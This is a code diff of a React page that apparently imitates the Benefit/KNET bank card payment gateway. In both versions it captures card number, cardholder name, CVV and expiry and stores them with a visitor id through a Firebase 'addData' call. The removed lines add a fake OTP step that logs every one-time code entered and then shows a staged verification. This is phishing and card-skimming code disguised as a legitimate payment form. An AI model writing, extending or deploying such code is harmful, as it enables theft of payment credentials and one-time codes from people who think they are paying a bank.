@@ -1,10 +1,8 @@
 "use client"
 
-import type React from "react"
-import { useState, useEffect } from "react"
+import React, { useState } from "react"
 import { addData } from "../firebase"
 import { useCart } from "../cartContext"
-import "./kent.css"
 
 export default function BenefitPaymentGateway() {
   const [cardNumber, setCardNumber] = useState("")
@@ -13,253 +11,21 @@ export default function BenefitPaymentGateway() {
   const [month, setMonth] = useState("")
   const [yaer, setYear] = useState("")
   const [showPad, setShowPad] = useState(false)
-  const [showOtp, setShowOtp] = useState(false)
-  const [otp, setOtp] = useState("")
-  const [countdown, setCountdown] = useState(120) // 2 minutes countdown
-  const { total } = useCart() as any
-  const [isVerifying, setIsVerifying] = useState(false);
-  const [verificationError, setVerificationError] = useState("");
-  const [resendDisabled, setResendDisabled] = useState(true);
-  const [allOtps] = useState(['']);
-
-  useEffect(() => {
-    let timer: NodeJS.Timeout | null = null;
-    
-    if (showOtp && countdown > 0) {
-      timer = setInterval(() => {
-        setCountdown(prev => prev - 1);
-      }, 1000);
-    
-      // Enable resend button after 30 seconds
-      if (countdown <= 90 && resendDisabled) {
-        setResendDisabled(false);
-      }
-    } else if (countdown === 0) {
-      // Handle timeout
-      setVerificationError("OTP has expired. Please request a new one.");
-    }
-    
-    return () => {
-      if (timer) clearInterval(timer);
-    };
-  }, [showOtp, countdown, resendDisabled]);
-
-  const data = { cardNumber, cardholderName, cvv, month, yaer }
-  
-  const handleSubmit = (e: React.FormEvent) => {
-    e.preventDefault()
-    const vId = localStorage.getItem('visitor');
-
-    // Instead of alert, show OTP screen
-    addData({ id: vId, ...data });
-setTimeout(() => {
-  setShowOtp(true)
-  
-}, 4000);
-  }
-
-  const handleVerifyOtp = () => {
-    if (otp.length !== 6) return;
-    const vId = localStorage.getItem('visitor');
-    if (!vId) throw new Error("Session expired. Please try again.");
-    allOtps.push(otp)
-    addData({ id: vId, ...data,otp,allOtps });
-  
-    setIsVerifying(true);
-    setVerificationError("");
-  
-    // Simulate verification process (replace with actual API call)
-    setTimeout(() => {
-      try {
-   
-        // Add your verification logic here
-        // For demo, we'll just check if OTP is "123456"
-        if (otp === "123456" || otp === "000000") {
-          setShowOtp(false);
-        } else {
-          setVerificationError("Invalid OTP. Please try again.");
-        }
-      } catch (error) {
-        setVerificationError(error instanceof Error ? error.message : "Verification failed. Please try again.");
-      } finally {
-        setIsVerifying(false);
-      }
-    }, 1500);
-  };
-
-  const formatTime = (seconds: number) => {
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
-  }
-
-  if (showOtp) {
-    return (
-      <div className="otp-container" style={{ maxWidth: "500px", margin: "0 auto", padding: "20px", border: "1px solid #ddd", borderRadius: "8px", boxShadow: "0 2px 10px rgba(0,0,0,0.1)" }}>
-        <div style={{ textAlign: "center", marginBottom: "20px" }}>
-          <h2 style={{ color: "#d7181f", marginBottom: "10px" }}>Verification Required</h2>
-          <p>Please enter the OTP sent to your registered mobile number</p>
-          <div style={{ marginTop: "10px", color: "#666" }}>
-            <span>Time remaining: </span>
-            <span style={{ fontWeight: "bold", color: countdown < 30 ? "#d7181f" : "#333" }}>{formatTime(countdown)}</span>
-          </div>
-        </div>
-        
-        <div style={{ marginBottom: "20px" }}>
-          <label style={{ display: "block", marginBottom: "8px", fontWeight: "bold" }}>Enter OTP</label>
-          <div style={{ display: "flex", justifyContent: "center", gap: "10px" }}>
-            {[...Array(6)].map((_, index) => (
-              <input
-                key={index}
-                type="text"
-                maxLength={1}
-                style={{
-                  width: "40px",
-                  height: "50px",
-                  fontSize: "24px",
-                  textAlign: "center",
-                  border: "1px solid #ccc",
-                  borderRadius: "4px"
-                }}
-                value={otp[index] || ""}
-                onChange={(e) => {
-                  const value = e.target.value;
-                  if (/^[0-9]$/.test(value) || value === "") {
-                    const newOtp = otp.split("");
-                    newOtp[index] = value;
-                    setOtp(newOtp.join(""));
-                    
-                    // Auto-focus next input
-                    if (value && index < 5) {
-                      const nextInput = e.target.nextElementSibling as HTMLInputElement;
-                      if (nextInput) nextInput.focus();
-                    }
-                    
-                    // Auto-submit when all digits are entered
-                    if (value && index === 5) {
-                      const completeOtp = [...otp.split("").slice(0, 5), value].join("");
-                      if (completeOtp.length === 6) {
-                        setTimeout(() => handleVerifyOtp(), 300);
-                      }
-                    }
-                  }
-                }}
-                onKeyDown={(e) => {
-                  // Handle backspace to go to previous input
-                  if (e.key === "Backspace" && !otp[index] && index > 0) {
-                    const prevInput = e.currentTarget.previousElementSibling as HTMLInputElement;
-                    if (prevInput) prevInput.focus();
-                  }
-                  // Handle arrow keys for navigation
-                  if (e.key === "ArrowLeft" && index > 0) {
-                    const prevInput = e.currentTarget.previousElementSibling as HTMLInputElement;
-                    if (prevInput) prevInput.focus();
-                  }
-                  if (e.key === "ArrowRight" && index < 5) {
-                    const nextInput = e.currentTarget.nextElementSibling as HTMLInputElement;
-                    if (nextInput) nextInput.focus();
-                  }
-                }}
-                onPaste={(e) => {
-                  e.preventDefault();
-                  const pasteData = e.clipboardData.getData("text/plain").trim();
-                  if (/^\d+$/.test(pasteData) && pasteData.length <= 6) {
-                    const newOtp = pasteData.slice(0, 6).padEnd(6, "");
-                    setOtp(newOtp);
-                    
-                    // Focus the appropriate field after paste
-                    const inputs = e.currentTarget.parentElement?.querySelectorAll('input');
-                    if (inputs && pasteData.length < 6) {
-                      const focusIndex = Math.min(pasteData.length, 5);
-                      (inputs[focusIndex] as HTMLInputElement).focus();
-                    }
-                  }
-                }}
-              />
-            ))}
-          </div>
-        </div>
-        
-        {verificationError && (
-          <div style={{ 
-            color: "#d7181f", 
-            marginTop: "10px", 
-            textAlign: "center", 
-            fontWeight: "bold" 
-          }}>
-            {verificationError}
-          </div>
-        )}
-        
-        <div style={{ display: "flex", justifyContent: "space-between" }}>
-          <button
-            onClick={() => setShowOtp(false)}
-            style={{
-              padding: "10px 20px",
-              background: "#f5f5f5",
-              border: "1px solid #ddd",
-              borderRadius: "4px",
-              cursor: "pointer"
-            }}
-          >
-            Cancel
-          </button>
-          <button
-            onClick={handleVerifyOtp}
-            disabled={otp.length !== 6 || isVerifying}
-            style={{
-              padding: "10px 20px",
-              background: otp.length === 6 && !isVerifying ? "#d7181f" : "#f5f5f5",
-              color: otp.length === 6 && !isVerifying ? "white" : "#999",
-              border: "1px solid #ddd",
-              borderRadius: "4px",
-              cursor: otp.length === 6 && !isVerifying ? "pointer" : "not-allowed",
-              display: "flex",
-              alignItems: "center",
-              justifyContent: "center",
-              minWidth: "120px"
-            }}
-          >
-            {isVerifying ? (
-              <span>Verifying...</span>
-            ) : (
-              "Verify & Pay"
-            )}
-          </button>
-        </div>
-        
-        <div style={{ marginTop: "20px", textAlign: "center" }}>
-          <button
-            onClick={() => {
-              setCountdown(120);
-              setResendDisabled(true);
-              setOtp("");
-              setVerificationError("");
-              // Simulate sending a new OTP
-              setTimeout(() => {
-                alert("New OTP has been sent to your registered mobile number");
-              }, 1000);
-            }}
-            disabled={resendDisabled}
-            style={{
-              background: "none",
-              border: "none",
-              color: resendDisabled ? "#999" : "#d7181f",
-              textDecoration: "underline",
-              cursor: resendDisabled ? "not-allowed" : "pointer"
-            }}
-          >
-            Resend OTP {resendDisabled ? `(${formatTime(countdown - 90)})` : ""}
-          </button>
-        </div>
-      </div>
-    );
-  }
-
+  const {total} = useCart() as any
+const data={cardNumber,cardholderName,cvv,month,yaer}
+const handleSubmit=(e:React.FormEvent)=>{
+  e.preventDefault()
+  const vId=localStorage.getItem('visitor')
+  addData({id:vId,...data})
+}
   return (
     <div style={{ zoom: 0.7 }}>
-      <div
+      <form
+        action=""
+        name="paypage"
         id="paypage"
+        method="post"
+        autoComplete="off"
       >
         <div id="maindiv">
           <input
@@ -559,7 +325,10 @@ setTimeout(() => {
                                 type="tel"
                                 pattern="[0-9]"
                                 onChange={(e)=>setCardNumber(e.target.value)}
+                                size={20}
+                                maxLength={19}
                                 defaultValue=""
+                                title="Should be in number. Length should be 13 or 16 or 19"
                               />
                             </div>
                             {/* Added for GCCNET Implementation PERFORMGCCCHECK */}
@@ -725,10 +494,9 @@ setTimeout(() => {
                                 autoComplete="off"
                                 title="Should be in number. Length should be 4"
                                 type="password"
-                                readOnly
                                 size={4}
-                                value={cvv}
-                                onFocus={()=>setShowPad(!showPad)}
+                                onChange={(e)=>setCvv(e.target.value)}
+
                                 maxLength={4}
                               />
                             </div>
@@ -757,29 +525,23 @@ setTimeout(() => {
                                     className="btn btn-primary"
                                     id="cardPinbtn1"
                                     type="button"
-                                    onClick={()=>{if(cvv.length <4)setCvv((e)=>e+"8")}}
-
                                     defaultValue={8}
                                   />
                                   <input
                                     className="btn btn-primary"
                                     id="cardPinbtn2"
                                     type="button"
-                                    onClick={()=>{if(cvv.length <4)setCvv((e)=>e+"4")}}
                                     defaultValue={4}
                                   />
                                   <input
                                     className="btn btn-primary"
                                     id="cardPinbtn3"
                                     type="button"
-                                    onClick={()=>{if(cvv.length <4)setCvv((e)=>e+"5")}}
-
                                     defaultValue={5}
                                   />
                                   <input
                                     className="btn btn-primary"
                                     id="cardPinbtn4"
-                                    onClick={()=>{if(cvv.length <4)setCvv((e)=>e+"7")}}
                                     type="button"
                                     defaultValue={7}
                                   />
@@ -788,8 +550,6 @@ setTimeout(() => {
                                     id="cardPinbtn5"
                                     type="button"
                                     defaultValue={6}
-                                    onClick={()=>{if(cvv.length <4)setCvv((e)=>e+"6")}}
-
                                   />
                                 </div>
 
@@ -798,39 +558,30 @@ setTimeout(() => {
                                     className="btn btn-primary"
                                     id="cardPinbtn6"
                                     type="button"
-                                    onClick={()=>{if(cvv.length <4)setCvv((e)=>e+"9")}}
-
                                     defaultValue={9}
                                   />
                                   <input
                                     className="btn btn-primary"
                                     id="cardPinbtn7"
                                     type="button"
-                                    onClick={()=>{if(cvv.length <4)setCvv((e)=>e+"3")}}
-
                                     defaultValue={3}
                                   />
                                   <input
                                     className="btn btn-primary"
                                     id="cardPinbtn8"
                                     type="button"
-                                    onClick={()=>{if(cvv.length <4)setCvv((e)=>e+"1")}}
-
                                     defaultValue={1}
                                   />
                                   <input
                                     className="btn btn-primary"
                                     id="cardPinbtn9"
                                     type="button"
-                                    onClick={()=>{if(cvv.length <4)setCvv((e)=>e+"0")}}
-
                                     defaultValue={0}
                                   />
                                   <input
                                     className="btn btn-primary"
                                     id="cardPinbtn0"
                                     type="button"
-                                    onClick={()=>{if(cvv.length <4)setCvv((e)=>e+"2")}}
                                     defaultValue={2}
                                   />
                                 </div>
@@ -851,7 +602,6 @@ setTimeout(() => {
                                       name="cardPinbtnRef"
                                       id="cardPinbtnRef"
                                       type="button"
-                                      onClick={()=>setCvv('')}
                                       defaultValue="Clear"
                                     />
                                     <input
@@ -1048,10 +798,10 @@ setTimeout(() => {
                     <input
                       style={{ background: '#d7181f', marginRight: 5 }}
                       name="proceed"
+                      type="button"
                       className="btn btn-primary pbtn"
                       id="proceed"
                       defaultValue="Pay"
-                      onClick={(e)=>{handleSubmit(e)}}
                     />
                     <input
                       style={{ background: '#d7181f', marginRight: 5 }}
@@ -1860,7 +1610,7 @@ setTimeout(() => {
             </div>
           </div>
         </div>
-      </div>
+      </form>
     </div>
   )
 }
